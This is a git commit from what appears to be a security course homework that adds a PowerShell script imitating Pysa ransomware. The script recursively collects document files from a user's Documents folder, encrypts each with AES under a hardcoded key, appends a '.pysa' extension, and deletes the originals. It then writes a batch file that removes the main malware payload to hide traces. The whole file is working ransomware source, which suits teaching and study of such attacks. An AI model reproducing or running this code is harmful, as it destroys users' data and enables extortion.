34a11b989db19aec3dd42d28aa530b8a7cae22b0
unknown <benhacked@emul.info>
2022-04-19 23:11:42 -0400

    hw week 12

---
+++ Week12/homework/pysa.ps1
@@ -0,0 +1,131 @@
+## Task 1: Creating a list of pdf, xlsx, and docx files in the "Documents" folder.
+
+Get-ChildItem -Recurse -Include *.pdf,*.docx,*.txt -Path C:/Users/benhacked.EMUL/Documents |Export-Csv `
+-Path ./Week12/homework/xtra.csv
+
+
+# Import CSV file.
+
+$fileList = import-csv -Path C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week12\Homework\xtra.csv -header FullName
+
+#$fileList
+
+## Task 2: Loop through the CSV files and encrypt each of the files
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".pysa"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".pysa"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+
+#Loop through the results
+
+foreach ($f in $fileList) {
+
+#    Get-Childitem -Path $f.FullName
+    Invoke-AESEncryption -Mode Encrypt -Key "Unl0[k_M3" -Path $f.FullName
+
+    # Removes the unencrypted files
+    Remove-Item -Path $f.FullName
+}
+
+# Delete main payload that contains malware
+
+$malware_del = @"
+del ../../Week12/Homework/class2.ps1
+"@
+
+# Create Update.bat file with $delete_mal code
+
+$fPath = "C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week12\Homework\"
+
+$Writer = $fPath + "refresher.bat"
+
+$malware_del | Out-File -FilePath $Writer
